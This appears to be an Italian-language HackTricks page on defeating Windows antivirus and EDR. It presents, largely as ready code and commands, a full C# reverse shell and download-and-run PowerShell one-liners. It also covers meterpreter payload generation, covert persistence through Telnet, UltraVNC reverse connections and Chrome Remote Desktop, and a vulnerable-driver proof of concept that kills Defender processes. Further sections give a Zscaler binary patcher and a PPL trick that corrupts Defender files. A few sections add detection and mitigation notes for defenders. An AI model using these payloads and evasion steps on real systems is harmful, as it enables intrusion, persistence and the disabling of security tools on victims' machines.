Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi dando alla macchina compromessa accesso **all'ambiente interprete installato sulla SMB share controllata dall'attaccante**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla SMB share puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repo indica: Defender continua a scansionare gli script ma utilizzando Go, Java, PHP ecc. abbiamo **più flessibilità per bypassare le firme statiche**. Test con reverse shell casuali non offuscate in questi linguaggi si sono dimostrati efficaci.

## TokenStomping

Token stomping è una tecnica che permette a un attaccante di **manipolare il token di accesso o un prodotto di sicurezza come un EDR o AV**, consentendo di ridurne i privilegi in modo che il processo non muoia ma non abbia i permessi per controllare attività malevole.

Per prevenire questo Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop nel PC di una vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
1. Scarica da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricarlo.
2. Esegui l'installer in modalità silenziosa sulla vittima (richiede privilegi admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca Avanti. Il wizard chiederà di autorizzare; clicca il pulsante Authorize per continuare.
4. Esegui il parametro fornito con qualche aggiustamento: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che permette di impostare il pin senza usare la GUI).


## Evasione avanzata

L'evasione è un argomento molto complesso: a volte bisogna tenere conto di molte fonti di telemetria in un singolo sistema, quindi è praticamente impossibile restare completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui operi avrà i suoi punti di forza e debolezza.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94) per avere un'introduzione a tecniche di evasione avanzata.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) su Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Tecniche obsolete**

### **Controlla quali parti Defender considera malevoli**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** finché non scopre quale parte Defender considera malevola e te la segnalerà.\
Un altro tool che fa la **stessa cosa è** [**avred**](https://github.com/dobin/avred) con un servizio web pubblico in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows 10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) facendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **start** all'avvio del sistema e **run** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**SUL HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file **appena** creato _**UltraVNC.ini**_ nella **vittima**

#### **Connessione inversa**

L'**attaccante** dovrebbe **eseguire sul** suo **host** il binario `vncviewer.exe -listen 5900` in modo che sia **pronto** a catturare una **connessione VNC inversa**. Poi, nella **vittima**: avvia il demone `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la furtività devi evitare alcune azioni

- Non avviare `winvnc` se è già in esecuzione o attiverai un [popup](https://i.imgur.com/1SROTTl.png). Verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per l'aiuto o attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **start the lister** con `msfconsole -r file.rc` ed **esegui** il **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Il Defender corrente terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima C# Revershell

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Scaricamento ed esecuzione automatica:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscators per C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di python per build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Disabilitare AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare ransomware. Lo strumento porta il suo **driver vulnerabile ma *signed*** e lo sfrutta per emettere operazioni privilegiate in kernel che persino i servizi AV Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Signed driver**: Il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente signed `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver reca una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come servizio **kernel** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile dallo user land.
3. **IOCTLs exposed by the driver**
| Codice IOCTL | Capacità                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario per PID (usato per terminare i servizi Defender/EDR) |
| `0x990000D0` | Cancellare un file arbitrario su disco |
| `0x990001D0` | Scaricare il driver e rimuovere il servizio |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**:  BYOVD aggira completamente le protezioni user-mode; il codice che viene eseguito in kernel può aprire processi *protected*, terminarli o manomettere oggetti kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare la block list dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.  
•  Monitorare la creazione di nuovi servizi *kernel* e generare alert quando un driver viene caricato da una directory scrivibile da tutti o non è presente nella allow-list.  
•  Monitorare gli handle in user-mode verso oggetti device personalizzati seguiti da sospette chiamate a `DeviceIoControl`.

### Bypass dei controlli di posture del Client Connector di Zscaler tramite patching dei binari su disco

Il **Client Connector** di Zscaler applica le regole di device-posture localmente e si affida a Windows RPC per comunicare i risultati ad altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (viene inviato un booleano al server).  
2. Gli endpoint RPC interni verificano solo che l'eseguibile connesso sia **signed by Zscaler** (tramite `WinVerifyTrust`).

Patchando quattro binari signed su disco entrambi i meccanismi possono essere neutralizzati:

| Binary | Logica originale patchata | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1` in modo che ogni controllo risulti conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche non firmato) può bindare alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituito con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Saltati / short-circuited |

Estratto minimale del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutte** le posture checks mostrano **green/compliant**.
* Binaries non firmati o modificati possono aprire gli endpoint RPC named-pipe (es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy Zscaler.

Questo case study dimostra come decisioni di trust puramente client-side e semplici controlli di firma possano essere sconfitti con pochi byte patch.

## Abuso di Protected Process Light (PPL) per manomettere AV/EDR con LOLBINs

Protected Process Light (PPL) impone una gerarchia signer/level in modo che solo processi protetti di pari o superiore livello possano manomettersi a vicenda. In ambito offensivo, se puoi avviare legittimamente un binario abilitato PPL e controllarne gli argomenti, puoi convertire funzionalità benigni (e.g., logging) in una constrained, PPL-backed write primitive verso le directory protette usate da AV/EDR.

Cosa fa sì che un processo venga eseguito come PPL
- Il target EXE (e qualsiasi DLL caricata) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un livello di protezione compatibile che corrisponda al signer del binario (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per anti-malware signers, `PROTECTION_LEVEL_WINDOWS` per Windows signers). Livelli sbagliati falliranno alla creazione.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Helper open-source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE target):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Pattern di utilizzo:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitiva LOLBIN: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` si auto-avvia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando avviato come processo PPL, la scrittura del file avviene con backing PPL.
- ClipUp non può parsare percorsi contenenti spazi; usare nomi in formato 8.3 per puntare a posizioni normalmente protette.

8.3 short path helpers
- Elencare i nomi brevi: `dir /x` in ogni directory padre.
- Ricavare il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avviare la LOLBIN con supporto PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (es., CreateProcessAsPPL).
2) Passare l'argomento log-path di ClipUp per forzare la creazione di un file in una directory AV protetta (es., Defender Platform). Usare nomi 8.3 se necessario.
3) Se il binario target è normalmente aperto/bloccato dall'AV mentre è in esecuzione (es., MsMpEng.exe), pianificare la scrittura all'avvio prima che l'AV si avvii installando un servizio ad avvio automatico che venga eseguito prima in modo affidabile. Validare l'ordine di avvio con Process Monitor (registrazione all'avvio).
4) Al riavvio la scrittura con backing PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file target e impedendone l'avvio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare il contenuto che `ClipUp` scrive oltre alla posizione; la primitiva è adatta alla corruzione piuttosto che all'iniezione precisa di contenuto.
- Richiede privilegi locali admin/SYSTEM per installare/avviare un servizio e una finestra di reboot.
- Il timing è critico: il target non deve essere aperto; l'esecuzione all'avvio evita lock sui file.

Rilevamenti
- Creazione di processi di `ClipUp.exe` con argomenti insoliti, specialmente parentati da launcher non standard, attorno all'avvio.
- Nuovi servizi configurati per l'auto-avvio di binari sospetti e che si avviano sistematicamente prima di Defender/AV. Indagare la creazione/modifica dei servizi prima dei fallimenti d'avvio di Defender.
- Monitoraggio dell'integrità dei file sui binari di Defender/delle directory Platform; creazioni/modifiche di file inattese da processi con flag protected-process.
- ETW/EDR telemetry: cercare processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo del livello PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e sotto quali parent; bloccare l'invocazione di ClipUp al di fuori dei contesti legittimi.
- Igiene dei servizi: limitare la creazione/modifica di servizi ad avvio automatico e monitorare manipolazioni dell'ordine di avvio.
- Assicurarsi che la protezione contro la manomissione di Defender e le protezioni di early-launch siano abilitate; indagare errori di avvio che indicano corruzione dei binari.
- Considerare la disabilitazione della generazione di nomi brevi 8.3 sui volumi che ospitano strumenti di sicurezza, se compatibile con il vostro ambiente (test approfonditi).

Riferimenti per PPL e tooling
- Panoramica Microsoft — Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Riferimento EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (validazione dell'ordine): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Analisi tecnica (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
